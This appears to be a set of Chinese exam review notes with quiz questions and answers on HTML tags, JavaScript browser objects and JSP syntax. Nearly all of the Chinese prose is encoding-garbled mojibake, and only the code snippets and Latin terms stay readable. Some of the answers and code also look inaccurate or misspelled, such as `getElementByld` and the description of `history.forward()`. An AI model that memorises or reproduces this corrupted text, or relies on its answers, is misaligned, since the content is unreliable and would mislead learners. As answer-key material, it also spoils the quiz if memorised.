æ˜¯å°†å†…å®¹è®¾ç½®ä¸ºæ–œä½“ã€‚ ã€è¡¨æ ¼æ ‡ç­¾ã€‘å½“è®¾ç½®çš„å±æ€§æœ‰é‡å æ—¶ï¼Œè¡¨å…ƒçš„å±æ€§é»˜è®¤æƒ…å†µä¸‹æ€»æ˜¯è·Ÿå®ƒç¦»å¾—æœ€è¿‘çš„è®¾ç½®ç›¸åŒã€‚ åœ¨æ ‡ç­¾çš„å±æ€§ä¸­ï¼Œalt å±æ€§èƒ½åœ¨å›¾ç‰‡æœªè½½å…¥æˆ–è½½å…¥å¤±è´¥æ—¶æä¾›æ›¿ä»£æ€§çš„æ–‡å­—è¯´æ˜ã€‚ è¡¨å•ä¸­çš„æ ‡ç­¾è¡¨ç¤ºä¸‹æ‹‰èœå•ã€‚ ä¸‹åˆ—å…³äºæ¡†æ¶çš„è¯´æ³•ä¸æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ A. æ ‡ç­¾çš„colså±æ€§è¡¨ç¤ºå°†é¡µé¢æ¨ªå‘åˆ†å‰²ã€‚ âŒ B. ä¸€ä¸ªæ¡†æ¶ç½‘é¡µä¸­çš„æ¯ä¸ªçª—å£éƒ½æ˜¯ä¸€ä¸ªå®Œå–„çš„HTMLç½‘é¡µã€‚ C. åœ¨æ¡†æ¶ä¸­ä¸éœ€è¦å†å†™ã€‚ D. æ¯ä¸€ä¸ªè¡¨ç¤ºä¸€ä¸ªæ¡†æ¶çª—å£ï¼Œå®ƒçš„æ’åºä¾æ¬¡ä¸ºä»å·¦åˆ°å³ã€ä»ä¸Šåˆ°ä¸‹ã€‚ rows :æ¨ªå‘åˆ†å‰²ç½‘é¡µã€‚å±æ€§å€¼å†³å®šäº†åˆ†å‰²é¡µé¢ä¹‹é—´çš„å®½åº¦çš„æ¯”å€¼ã€‚ cols :çºµå‘åˆ†å‰²ç½‘é¡µã€‚å±æ€§å€¼å†³å®šäº†åˆ†å‰²é¡µé¢ä¹‹é—´çš„é•¿åº¦çš„æ¯”å€¼ã€‚ border :æ¡†æ¶è¾¹æ¡†çš„å®½åº¦ã€‚å½“å€¼ä¸º 0 æ—¶ï¼Œè¡¨ç¤ºæ²¡æœ‰è¾¹æ¡†ã€‚ HTMLçš„ä¸­æ–‡åç§°æ˜¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ã€‚ åœ¨HTMLè¯­è¨€ä¸­ç©ºæ ¼ç”¨&amp;nbspè¡¨ç¤ºã€‚ åœ¨HTMLä¸­æœ‰ä¸¤ç§ç±»å‹çš„æ ‡ç­¾ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯å•æ ‡ç­¾å’ŒåŒæ ‡ç­¾ã€‚ åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œæ–‡å­—ä¹‹é—´çš„æ¢è¡Œå¿…é¡»ä½¿ç”¨æ ‡ç­¾ã€‚ æ ‡ç­¾å†…å®¹è¡¨ç¤ºå®ƒæ‰€åŒ…å›´çš„å†…å®¹æ˜¯æœ‰åºåˆ—è¡¨æ ‡ç­¾ï¼Œè€Œå†…å®¹è¡¨ç¤ºæ— åºæ ‡ç­¾ã€‚ åœ¨è¡¨æ ¼æ ‡ç­¾ä¸­ &lt;table&gt;&lt;/ table&gt; :å®šä¹‰è¡¨æ ¼ï¼Œè¡¨æ ¼çš„æ‰€æœ‰å†…å®¹éƒ½å†™åœ¨è¿™ä¸ªæ ‡ç­¾ä¹‹å†…&lt;caption&gt;&lt;/caption&gt; :å®šä¹‰æ ‡é¢˜ï¼Œæ ‡é¢˜ä¼šè‡ªåŠ¨å‡ºç°åœ¨æ•´å¼ è¡¨æ ¼çš„ä¸Šæ–¹&lt;tr&gt;&lt;/tr&gt; :å®šä¹‰è¡¨è¡Œ&lt;th&gt;&lt;/th&gt; :å®šä¹‰è¡¨å¤´ï¼ŒåŒ…å«åœ¨ ä¹‹é—´ï¼Œè¡¨å¤´ä¸­çš„æ–‡å­—ä¼šè‡ªåŠ¨å˜æˆç²—ä½“&lt;td&gt;&lt;/td&gt; :å®šä¹‰è¡¨å…ƒ(è¡¨æ ¼çš„å…·ä½“æ•°æ®)ï¼ŒåŒ…å«åœ¨ ä¹‹é—´ å•å‡»â€œç™¾åº¦â€å³å¯è¶…é“¾æ¥åˆ°ç™¾åº¦çš„ä¸»é¡µï¼Œä»£ç è¿™æ ·å†™&lt;a href&#x3D;â€www.baidu.comâ€œ&gt;ç™¾åº¦ã€‚ hrefçš„ç½‘å€è¦ç”¨åŒå¼•å·å¼•èµ·æ¥ æ ‡ç­¾çš„type:å†³å®šäº†è¡¨å•å…ƒç´ çš„ç±»å‹ï¼Œå¯ä»¥ä¸ºä»¥ä¸‹çš„å€¼ text :æ–‡æœ¬æ¡†ã€‚æ˜¯typeçš„é»˜è®¤å±æ€§password:å¯†ç æ¡†radio:å•é€‰æŒ‰é’®ï¼Œå¯ä»¥å°†å¤šä¸ªå•é€‰æŒ‰é’®çš„nameå±æ€§è®¾ç½®ç›¸åŒï¼Œä½¿å…¶æˆä¸ºä¸€ç»„ã€‚checkedå±æ€§å¯è®¾ç½®ï¼Œé»˜è®¤è¢«é€‰checkbox:å¤é€‰æ¡†checkedå±æ€§å¯è®¾ç½®é»˜è®¤è¢«é€‰reset:é‡ç½®æŒ‰é’®ï¼ŒæŒ‰ä¸‹ä¹‹åï¼Œæ‰€æœ‰çš„è¡¨å•å…ƒç´ å†…å®¹å˜ä¸ºé»˜è®¤å€¼button:æ™®é€šæŒ‰é’®submit:æäº¤æŒ‰é’®ï¼ŒæŒ‰ä¸‹ä¹‹åï¼Œç½‘é¡µä¼šå°†è¡¨å•çš„å†…å®¹æäº¤ç»™actionè®¾å®šçš„ç½‘é¡µï¼Œ action çš„å€¼ ä¸ºç©ºæ—¶æäº¤ç»™æœ¬é¡µimage:å›¾ç‰‡ï¼Œä½†æ˜¯ç‚¹å‡»å®ƒçš„æ•ˆæœä¸æäº¤æŒ‰é’®ä¸€æ ·ï¼Œéƒ½ä¼šæäº¤è¡¨å• æ ‡ç­¾çš„rowså±æ€§è¡¨ç¤ºå°†é¡µé¢æ¨ªå‘åˆ†å‰² æ ‡ç­¾çš„srcå±æ€§çš„å€¼è¡¨ç¤ºæ¡†æ¶å†…å®¹çš„åœ°å€ åœ¨htmlæ ‡ç­¾ä¸­è¦è®¾ç½®å­—ä½“çš„æ ·å¼éœ€è¦ä½¿ç”¨çš„å±æ€§ä¸º Size Font face âœ… color è¦ç”¨çš„æ ‡ç­¾æ˜¯ fontï¼Œè¦ç”¨çš„ä»–çš„faceå±æ€§ è¦å°†ä¸¤æ®µæ–‡å­—Javaå’ŒWebè®¾ç½®åœ¨åŒä¸€è¡Œæ˜¾ç¤ºï¼Œå¯ä»¥ä½¿ç”¨: 1&lt;h7&gt;Java&lt;/h7&gt;&lt;h8&gt;Web&lt;/h8&gt; æ ‡é¢˜æ ‡ç­¾åªæœ‰1-6ï¼Œè¶…è¿‡èŒƒå›´çš„éƒ½ä¼šä»¥é»˜è®¤å­—ä½“ã€å­—å·æ˜¾ç¤ºï¼Œå¹¶ä¸”æ²¡æœ‰æ¢è¡Œ ç°æœ‰éƒ¨åˆ†htmlä»£ç å¦‚ä¸‹: 1234567&lt;ol type=&quot;A&quot;&gt; &lt;li&gt;Java&lt;/li&gt; &lt;li&gt;Web&lt;/li&gt;&lt;/ol&gt; è¯·é—®è¿™æ®µä»£ç åœ¨æµè§ˆå™¨ä¸Šæ˜¾ç¤ºç»“æœæ˜¯ï¼ˆ A.JavaB.Web ï¼‰ typeå±æ€§å€¼ä¸ºaæ—¶ä¼šæ˜¾ç¤ºæœ‰åºåºå·aã€bã€câ€¦typeå±æ€§å€¼ä¸ºAæ—¶ä¼šæ˜¾ç¤ºæœ‰åºåºå·Aã€Bã€Câ€¦.typeå±æ€§å€¼ä¸ºå…¶ä»–å€¼æ—¶ï¼Œä¼šæ˜¾ç¤ºé»˜è®¤æœ‰åºåºå·1ã€2ã€3ã€4â€¦. åœ¨tableæ ‡ç­¾é‡Œï¼Œè¦åˆå¹¶ä¸€åˆ—çš„3ä¸ªå•å…ƒæ ¼éœ€è¦ä½¿ç”¨å“ªä¸ªå±æ€§å€¼ 12td.rowspan=&quot;3&quot; //è¡Œ td.colsapn=&quot;3&quot; //åˆ— ç°æœ‰éƒ¨åˆ†å…³äºå•é€‰æŒ‰é’®çš„Htmlä»£ç ï¼š 1234&lt;input type=&quot;radio&quot; name=&quot;1&quot; checked&gt;ç”· &lt;input type=&quot;radio&quot; name=&quot;2&quot; checked&gt;å¥³&lt;BR&gt; åœ¨æµè§ˆå™¨ä¸Šæ˜¾ç¤ºçš„æ•ˆæœæ˜¯ï¼ˆ â€œç”·â€å’Œâ€œå¥³â€éƒ½ä¼šè¢«é»˜è®¤é€‰ä¸­ ï¼‰ ä¸¤ä¸ªå•é€‰æŒ‰é’®çš„nameå±æ€§å€¼ä¸ä¸€æ ·ï¼Œè¯´æ˜ä»–ä»¬åˆ†åˆ«æ˜¯ä¸¤ç»„å•é€‰æŒ‰é’®ï¼Œæ‰€ä»¥ä¼šè¢«å…¨éƒ¨é€‰ä¸­ ç¬¬ä¸‰ç«  JavaScriptåŸºç¡€ ä¸‹åˆ—å…³äºJavaScriptçš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. JavaScriptçš„è¯­æ³•å’ŒJavaè¯­è¨€çš„è¯­æ³•éå¸¸ç±»ä¼¼ã€‚ B. JavaScriptå¯¹å¤§å°å†™æ˜¯æ•æ„Ÿçš„ã€‚ C. JavaScriptä¸­çš„å˜é‡æ˜¯å¼±å˜é‡ç±»å‹ï¼Œå³å˜é‡çš„ç±»å‹æ ¹æ®å®ƒè¢«èµ‹å€¼çš„ç±»å‹æ”¹å˜ã€‚ D. æœåŠ¡å™¨å¯¹JavaScriptè„šæœ¬ç¨‹åºè¿›è¡Œç¼–è¯‘ã€è¿è¡Œ âŒ javaScriptå¯ä»¥åµŒå…¥åˆ°HTMLä¸­ï¼Œæ˜¯ä¸€ç§è¿è¡Œåœ¨å®¢æˆ·ç«¯çš„è¯­è¨€ï¼Œç”±å®¢æˆ·ç«¯çš„æµè§ˆå™¨è¿›è¡Œè§£é‡Šæ‰§è¡Œï¼Œå¤§å°å†™æ•æ„Ÿ åœ¨ä¸‹é¢çš„JavaScriptè¯­å¥ä¸­ï¼Œvar arg1=10 å®šä¹‰äº†ä¸€ä¸ªæ•´å‹å˜é‡å¹¶èµ‹å€¼ä¸º10ã€‚ window.setTimeout(â€œfun()â€,1000)è¡¨ç¤ºçš„æ„æ€æ˜¯ï¼Œé—´éš”1ç§’åï¼Œfun()å‡½æ•°è¢«è°ƒç”¨1æ¬¡ã€‚ windowå¯¹è±¡çš„ status å±æ€§ç”¨æ¥æŒ‡å®šæµè§ˆå™¨çŠ¶æ€æ ä¸­æ˜¾ç¤ºçš„ä¸´æ—¶æ¶ˆæ¯ã€‚ åœ¨historyå¯¹è±¡ä¸­ä¸èƒ½å®ç°ç½‘é¡µå‰è¿›æ•ˆæœçš„æ–¹æ³•æ˜¯ï¼ˆï¼‰ã€‚ A. go(1) B. location C. back() âœ… D. forward() åœ¨æµè§ˆå™¨çš„çŠ¶æ€æ ä¸­æ˜¾ç¤ºâ€œè¿™æ˜¯çŠ¶æ€æ â€æ¶ˆæ¯çš„ä»£ç æ˜¯ window.status=â€è¿™æ˜¯çŠ¶æ€æ â€ ä¸‹åˆ—æ‰“å¼€æŒ‡å®šä½ç½®æ–°çª—å£çš„ä»£ç ä¸­æ­£ç¡®çš„æ˜¯window.open(â€œwindow2.htmlâ€,â€newâ€,â€top=10â€ åœ¨ä»£ç &lt;body onload=&quot;f1()&quot; onError=&quot;f2()&quot;&gt;&lt;input onFocus=&quot;g1()&quot; onClick=&quot;g2()&quot;&gt;&lt;/body&gt;ä¸­ï¼Œä¸€å®šä¼šè¢«è°ƒç”¨çš„æ–¹æ³•æ˜¯ f1() æµè§ˆå™¨å¯¹JavaScriptè„šæœ¬ç¨‹åºè¿›è¡Œè§£é‡Šæ‰§è¡Œã€‚ JavaScriptçš„3ç§æ³¨é‡Šå†™æ³•ä¸ºã€&#x2F;æ³¨é‡Šå†…å®¹ã€&#x2F;&#x2F;æ³¨é‡Šå†…å®¹ è‹¥å°†JavaScriptä»£ç å†™åœ¨å•ç‹¬çš„test.jsæ–‡ä»¶ä¸­ï¼Œéœ€è¦åœ¨è°ƒç”¨å®ƒçš„HTMLé¡µé¢ä¸­æ’å…¥çš„ä»£ç æ˜¯&lt;script src=&quot;test.js&quot; type=&quot;javascript&quot;&gt;&lt;/script&gt;ã€‚ JavaScriptçš„å†…ç½®å¯¹è±¡windowè´Ÿè´£æ“ä½œæµè§ˆå™¨çª—å£ window.alert() å¼¹å‡ºæ¶ˆæ¯æ¡† window.confirm() ç¡®è®¤æ¡† window.prompt() è¾“å…¥æ¡† window.open() æ–°çª—å£çš„åœ°å€ window.close()æ–¹æ³•å¯ä»¥å…³é—­çª—å£ historyå¯¹è±¡åŒ…å«ç”¨æˆ·çš„æµè§ˆå†å²ç­‰ä¿¡æ¯ï¼Œå…¶ä¸­history.forward()æ–¹æ³•ç›¸å½“äºå•å‡»æµè§ˆå™¨ä¸Šçš„åé€€æŒ‰é’®ï¼Œhistory.back()æ–¹æ³•ç›¸å½“äºå•å‡»æµè§ˆå™¨ä¸Šçš„å‰è¿›æŒ‰é’®ã€‚ history.back() åé€€ history.forward() å‰è¿› window.history.go(n) æ­£æ•° å‰è¿›né¡µï¼Œè´Ÿæ•° åé€€né¡µ åœ¨åä¸ºformçš„è¡¨å•ä¸­æœ‰ä¸€ä¸ªæ–‡æœ¬æ¡†accountï¼Œå…¶ä¸­çš„å†…å®¹å¯ä»¥ç”¨ä»£ç form.account.valueè·å¾—ã€‚ A. Ã— è¦ç”¨ç‰¹å®šçš„å‡½æ•°æ¥è·å¾— ç”¨locationå¯¹è±¡å®ç°è·³è½¬åˆ°ç½‘é¡µa.htmlçš„ä»£ç æ˜¯windows.location.href=&quot;a.html&quot;ã€‚ documentå¯¹è±¡ä»å±äºwindowå¯¹è±¡ã€‚ ç”¨documentå¯¹è±¡å¯ä»¥è¿›è¡Œä¸€äº›ç®€å•ç½‘é¡µå±æ€§çš„è®¾ç½®ï¼Œé€šè¿‡document.titleæ¥è®¿é—®æ ‡é¢˜ï¼Œé€šè¿‡document.locationæ¥è·å–å½“å‰ç½‘é¡µçš„åœ°å€ã€‚ ä»¥ä¸‹å“ªäº›JavaScriptå˜é‡çš„å‘½åæ˜¯é”™è¯¯çš„ï¼Ÿ (1)var hello; (2)var Java; (3)var 123; (4)var x%x; (5)var $hello; (6)var _Script; (7)var for; å‘½åè§„èŒƒï¼š é¦–ä½å­—ç¬¦å¿…é¡»æ˜¯å­—æ¯A-Zï¼Œa-zï¼Œ_ ï¼Œ$ã€‚ å…¶ä»–ä½ç½®ä¸Šå¯ä»¥æ˜¯ _ , $ , 0-9 , a-z ï¼Œ A-Z å…³é”®å­—ä¸èƒ½å‘½åï¼š for ç°æœ‰å¦‚ä¸‹è®¡æ—¶å™¨ä»£ç ï¼Œè¦è®©è®¡æ—¶å™¨æ­£ç¡®çš„æ˜¾ç¤ºåœ¨æ–‡æœ¬æ¡†é‡Œï¼Œè¯·è¡¥å…¨ç¼ºå¤±éƒ¨åˆ†ã€‚ï¼ˆï¼‰ 12345678910111213141516&lt;html&gt;&lt;body&gt; &lt;input type=&quot;text&quot; id=&quot;count&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; var num = 0; function startCount() &#123; document.getElementByld(&quot;count&quot;).value = num; ------------ num += 1; setTimeout(startCount, 1000); &#125; setTimeout(startCount, 1000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; alert(num) æ˜¾ç¤ºåœ¨å¼¹å‡ºçš„æ¶ˆæ¯æ¡†é‡Œï¼Œ window.status&#x3D;num æ˜¾ç¤ºåœ¨æµè§ˆå™¨çª—å£çš„çŠ¶æ€æ é‡Œï¼Œ getElementByld(â€œcountâ€).value &#x3D; num å°‘äº†å¯¹è±¡åä¼šå‡ºé”™ document.getElementByld(â€œcountâ€).value &#x3D; num å°†numé™„å€¼ç»™IDä¸ºcountçš„æ–‡æœ¬çš„å±æ€§å€¼value historyå¯¹è±¡çš„ ï¼ˆ go(-1) ï¼‰ æ–¹æ³•è¦æ±‚çª—å£æ˜¾ç¤ºåˆšåˆšè®¿é—®çš„å‰ä¸€ä¸ªé¡µé¢ history.back() è¿”å›ä¸Šä¸€é¡µ history.forward() è¿”å›ä¸‹ä¸€é¡µ history.go(n) å¦‚æœnæ˜¯æ­£æ•°å‰è¿›næ ¼ï¼Œè´Ÿæ•°è¡¨ç¤ºå‘åé€€næ ¼ åœ¨JavaScriptå†…ç½®å¯¹è±¡ä¸­ï¼Œä¸èƒ½å®ç°åœ¨å½“å‰é¡µé¢è·³è½¬çš„ä»£ç æ˜¯(window.open) window.open()åœ¨æ–°çª—å£è·³è½¬ å¯ä»¥åœ¨å½“å‰é¡µé¢è·³è½¬çš„æœ‰window.location.href , location.href , this.location.href , self.location.href , window.location.replace ä¸‹é¢ä»£ç å¯ä»¥å®ç°åœ¨é¡µé¢æ˜¾ç¤ºå¦‚å›¾ä¹ä¹ä¹˜æ³•è¡¨ï¼Œè¯·è¡¥å…¨ä»£ç ã€‚ 123456789101112131415161718&lt;html&gt;&lt;head&gt; &lt;title&gt;ä¹ä¹ä¹˜æ³•è¡¨&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; for (var i = 1; i &lt;= 9; i++) &#123; for (var j = 1; j &lt;= i; j++) &#123; a = i + &quot;*&quot; + j + &quot;=&quot; + i * j + &quot; &quot; **document.write(a)** ___________________ &#125; **document.write(&quot;&lt;br&gt;&quot;);** _________________ &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; alert() æ˜¯åœ¨å¼¹å‡ºçš„æ¶ˆæ¯æ¡†æ˜¾ç¤ºå†…å®¹ console.log()æ˜¯åœ¨æ§åˆ¶å°æ˜¾ç¤ºå†…å®¹ window.status()æ˜¯åœ¨æµè§ˆå™¨çª—å£çš„çŠ¶æ€æ æ˜¾ç¤ºå†…å®¹ document.write()å¯ä»¥åœ¨é¡µé¢æ˜¾ç¤ºå†…å®¹ ç¬¬å››ç«  JSPåŸºæœ¬è¯­æ³• ä¸‹åˆ—å…³äºJSPçš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. JSPå±äºé™æ€ç½‘é¡µã€‚ âŒ B. JSPå°†åŠ¨æ€ä»£ç åµŒå…¥åˆ°é™æ€çš„HTMLä¸­ï¼Œä»è€Œäº§ç”ŸåŠ¨æ€çš„è¾“å‡ºã€‚ C. JSPé¡µé¢æ˜¯ç”±JSPå®¹å™¨æ‰§è¡Œè¯¥é¡µé¢çš„Javaä»£ç éƒ¨åˆ†ï¼Œç„¶åå®æ—¶ç”ŸæˆHTMLé¡µé¢ã€‚ D. åœ¨å®¢æˆ·ç«¯çš„æºä»£ç ä¸­æ˜¯çœ‹ä¸åˆ°JSPé¡µé¢ä¸­çš„Javaä»£ç çš„ JSPæ˜¯åŠ¨æ€é¡µé¢ JSPé¡µé¢åœ¨ç¬¬ä¸€æ¬¡è¿è¡Œçš„æ—¶å€™è¢«JSPå¼•æ“è½¬æ¢ä¸º ****Servlet æ–‡ä»¶ã€‚ åœ¨ä¸‹åˆ—æ³¨é‡Šä¸­ä¼šå‘é€åˆ°æœåŠ¡å™¨çš„æ˜¯ï¼ˆï¼‰ã€‚ A. &#x2F;æ³¨é‡Šå†…å®¹&#x2F; B.&lt;%â€“æ³¨é‡Šå†…å®¹â€“%&gt; C. &#x2F;&#x2F;æ³¨é‡Šå†…å®¹ D. âœ… ä¸‹åˆ—å…³äºJSPè¡¨è¾¾å¼çš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. JSPè¡¨è¾¾å¼çš„ä½œç”¨æ˜¯å°†å…¶é‡Œé¢å†…å®¹æ‰€è¿ç®—çš„ç»“æœè¾“å‡ºåˆ°å®¢æˆ·ç«¯ã€‚ B. JSPè¡¨è¾¾å¼ä¸­çš„å†…å®¹ä¸€å®šæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæˆ–è€…èƒ½é€šè¿‡toString()å‡½æ•°è½¬æ¢æˆå­—ç¬¦ä¸²çš„å½¢å¼ã€‚ C. åœ¨JSPè¡¨è¾¾å¼ä¸­ä¸èƒ½å‡ºç°å¤šæ¡è¯­å¥ã€‚ D. åœ¨JSPè¡¨è¾¾å¼ä¸­èƒ½ç”¨â€œï¼›â€ç»“æŸã€‚ âŒ JSPè¡¨è¾¾å¼ï¼š&lt;%=å˜é‡/è¿”å›å€¼/è¡¨è¾¾å¼%&gt; JSPç¨‹åºæ®µï¼š&lt;% javaä»£ç  %&gt; JSPå£°æ˜ï¼š &lt;%! ä»£ç  ;%&gt; URLä¼ å€¼ï¼š &lt;% String str = request.getParameter(&quot;arg1&quot;); %&gt; JSPæŒ‡ä»¤ï¼š &lt;%@æŒ‡ä»¤ç±»åˆ« å±æ€§=&quot;å€¼&quot;%&gt; JSPåŠ¨ä½œï¼š &lt;jsp:åŠ¨ä½œå å±æ€§1=&quot;å±æ€§å€¼1&quot; å±æ€§n=&quot;å±æ€§å€¼n&quot; /&gt; &lt;jsp:åŠ¨ä½œå&gt;ç›¸å…³å†…å®¹&lt;/jsp:åŠ¨ä½œå&gt; JSPç¨‹åºæ®µçš„ç”¨æ³• &lt;%Javaä»£ç %&gt; åœ¨JSPé¡µé¢ä¸­å®šä¹‰ä¸€ä¸ªSringç±»å‹çš„Javaå…¨å±€å˜é‡strï¼Œæ­£ç¡®çš„ä»£ç æ˜¯&lt;%!Sring str;%&gt; ä½¿ç”¨content Type å±æ€§å¯ä»¥è®¾ç½®JSPçš„MIMEç±»å‹å’Œå¯é€‰å­—ç¬¦ç¼–ç ã€‚ ç”¨äºè®¾ç½®JavaBeanå±æ€§çš„åŠ¨ä½œæ˜¯&lt;jsp:setProperty&gt; ç”¨äºå°†è¯·æ±‚è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢çš„JSPåŠ¨ä½œæ˜¯ &lt;jsp:forward&gt; JSPæ³¨é‡Šä¸€å…±æœ‰3ç§ï¼Œåˆ†åˆ«æ˜¯ã€&lt;%â€“æ³¨é‡Šå†…å®¹â€“%&gt;ã€&#x2F;&#x2F;æ³¨é‡Šæˆ–&#x2F;æ³¨é‡Š**&#x2F;ã€‚ JSPç¨‹åºæ®µå°±æ˜¯æ’å…¥åˆ°JSPç¨‹åºçš„Javaä»£ç æ®µã€‚ åœ¨JSPå£°æ˜ä¸­å¯ä»¥å®šä¹‰ç½‘é¡µä¸­çš„å±€éƒ¨å˜é‡è¿™äº›å˜é‡åœ¨å£°æ˜çš„é‚£ä¸ªJSPé¡µé¢èƒ½ä½¿ç”¨ã€‚ åœ¨ä½¿ç”¨ä½¿ç”¨URLä¼ å€¼æ—¶ä¼ è¾“çš„æ•°æ®åªèƒ½æ˜¯Stringç±»å‹ã€‚ requestå¯¹è±¡è·å–è¯·æ±‚ä¿¡æ¯çš„æ–¹æ³•æ˜¯getParameter()ã€‚ JSPçš„3ä¸ªæŒ‡ä»¤æ˜¯pageã€includeå’Œ taglib pageæŒ‡ä»¤çš„importå±æ€§ç”¨æ¥å¯¼å…¥åŒ…ã€‚ å½“JSPç¨‹åºå‡ºç°æœªè¢«æ•è·çš„å¼‚å¸¸æ—¶å¯ä»¥ä½¿ç”¨errorPageè®¾ç½®è¦è·³è½¬çš„é¡µé¢ã€‚ include åŠ¨ä½œ åªä¼šæŠŠæ–‡ä»¶ä¸­çš„è¾“å‡ºåŒ…å«è¿›æ¥ã€‚include æŒ‡ä»¤ æ˜¯æŠŠæ–‡ä»¶åŒ…å«åˆ°JSPé¡µé¢ã€‚é€‚åˆå¯¼å…¥ä¸ä¼šç»å¸¸å˜åŒ–çš„èµ„æºã€‚ includeæŒ‡ä»¤å¯ä»¥åœ¨JSPç¨‹åºä¸­æ’å…¥å¤šä¸ªå¤–éƒ¨æ–‡ä»¶ã€‚ ç”¨æˆ·å¯ä»¥åœ¨ï¼ˆ â€œ&lt;jsp: å’Œ /&gt;â€ ï¼‰ æ ‡è®°ä¹‹é—´æ’å…¥åŠ¨ä½œ åœ¨â€œ&lt;%!â€å’Œâ€œ%&gt;â€æ ‡è®°ä¹‹é—´å£°æ˜çš„Javaæ–¹æ³•ç§°ä¸ºé¡µé¢çš„æˆå‘˜æ–¹æ³•ï¼Œå…¶ï¼ˆ åœ¨æ•´ä¸ªé¡µé¢å†… ï¼‰æœ‰æ•ˆã€‚ åœ¨Javaå£°æ˜æ ‡è®°çš„å£°æ˜çš„å˜é‡ã€æ–¹æ³•åœ¨æ•´ä¸ªé¡µé¢å†…æœ‰æ•ˆ åœ¨ç¨‹åºæ®µé‡Œå£°æ˜çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œä»å®šä¹‰ä¹‹åæœ‰æ•ˆ ç°æœ‰å¦‚ä¸‹JSPä»£ç ç‰‡æ®µã€‚ 123456&lt;%!int n=0;%&gt;&lt;% int m=0; (1); out.print(&quot;æ¬¢è¿è®¿é—®æœ¬ç½‘ç«™ï¼&lt;br&gt;&quot;); out.print(&quot;æ‚¨æ˜¯ç¬¬&quot;+ (2) +&quot;ä¸ªè®¿é—®æœ¬ç«™çš„å®¢æˆ·ã€‚&quot;);%&gt; è¦å®ç°ç½‘ç»œè®¡æ•°å™¨çš„åŠŸèƒ½ï¼Œè¯·è¡¥å…¨ä»£ç ã€‚ (1) n++ (2)n næ˜¯å…¨å±€å˜é‡ï¼Œmæ˜¯å±€éƒ¨å˜é‡ï¼Œæ‰€ä»¥ç”¨å…¨éƒ¨å˜é‡è¿›è¡Œç´¯åŠ  ç°æœ‰ä»¥ä¸‹jspä»£ç ç‰‡æ®µã€‚ 123&lt;% String str=&quot;12&quot;; int number=Integer.parseInt(str); %&gt;è¯¥æ•°å­—çš„å¹³æ–¹ä¸ºï¼š&lt;%=number*number %&gt;&lt;HR&gt;&lt;a href=&quot;4.6urlP2.jsp?number=______&quot;&gt;åˆ°è¾¾p2&lt;/a&gt; è¯·é—®ç©ºæ ¼å¤„å¡«ä»¥ä¸‹å“ªä¸ªä»£ç å¯ä»¥ç”¨urlä¼ å€¼? &lt;%=str+1%&gt; urlä¼ å€¼åªèƒ½ä¼ å­—ç¬¦ä¸²ï¼Œ è¿ç®—è¡¨è¾¾å¼ä¼šè¯­æ³•é”™è¯¯ï¼Œæ¯”å¦‚ 24+3 &lt;%=str+number%&gt; ä¸¤ä¸ªä¸åŒç±»å‹å˜é‡çš„å€¼ï¼Œè¯­æ³•é”™è¯¯ str æ˜¯å˜é‡æ— æ³•ä¼ å€¼ stræ˜¯å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä¸æ˜¯è¿›è¡Œè®¡ç®— ç°æœ‰ä»¥ä¸‹jspä»£ç ç‰‡æ®µã€‚ 123&lt;% String str=&quot;12&quot;; int number=Integer.parseInt(str); %&gt;è¯¥æ•°å­—çš„å¹³æ–¹ä¸ºï¼š&lt;%=number*number %&gt;&lt;HR&gt;&lt;a href=&quot;4.6urlP2.jsp?number=&lt;%=str+6%&gt;&quot;&gt;åˆ°è¾¾p2&lt;/a&gt; è¯·é—®èƒ½ä¸èƒ½ç”¨urlä¼ å€¼åˆ°4.6urlP2.jsp?å¦‚æœèƒ½ä¼ çš„å€¼æ˜¯å¤šå°‘ï¼Ÿ 126 æ˜¯ç›´æ¥è¿›è¡Œäº†ä¸€ä¸ªæ‹¼æ¥ ç°æœ‰å¦‚ä¸‹JSPä»£ç ç‰‡æ®µï¼Œç”¨æ¥è®¡ç®—çŸ©å½¢çš„é¢ç§¯ã€‚ 123456789101112131415&lt;% int row=Integer.parseInt(request.getParameter(&quot;&lt;tr&gt;&quot;));int col = Integer.parseInt(request.getParameter(&quot;&lt;td&gt;&quot;));out.print(&quot;&lt;table border=1&gt;&quot;);for(int i = 1; i &lt;= row; i++)&#123; out.print(&quot;&lt;tr&gt;&quot;); for(int j = 1; j &lt;= col; j++)&#123; out.print(&quot;&lt;td&gt;&quot;); out.print(i*j); out.print(&quot;&lt;/td&gt;&quot;); &#125; out.print(&quot;&lt;/tr&gt;&quot;);&#125;out.print(&quot;&lt;/table&gt;&quot;);%&gt; ç°åœ¨ç”¨jsp:paramåŠ¨ä½œâ€œåå­—-å€¼â€æ¥ä¸ºçŸ©å½¢çš„é•¿å’Œå®½ä¼ é€’å‚æ•°ï¼Œè¯·é—®ä¼ å€¼çš„â€œåå­—â€åº”è¯¥ä¸ºï¼ˆï¼‰ã€‚ &lt;tr&gt;å’Œ&lt;td&gt; ç¬¬äº”ç«  è¡¨å•å¼€å‘ ä¸‹åˆ—å…³äºè¡¨å•çš„è¯´æ³•ä¸æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ A. è¡¨å•æ˜¯å¯ä»¥ç”±ç”¨æˆ·è¾“å…¥å¹¶æäº¤ç»™å®¢æˆ·ç«¯çš„ä¸€ä¸ªå›¾å½¢ç•Œé¢ã€‚ âŒ B. åœ¨è¡¨å•ä¸­å¯ä»¥è¾“å…¥ä¸€äº›å†…å®¹ï¼Œè¿™äº›è¾“å…¥åŠŸèƒ½ç”±è¡¨å•å…ƒç´ æä¾›ã€‚ C. åœ¨è¡¨å•ä¸­ä¸€èˆ¬æœ‰ä¸€ä¸ªæŒ‰é’®è´Ÿè´£æäº¤ã€‚ 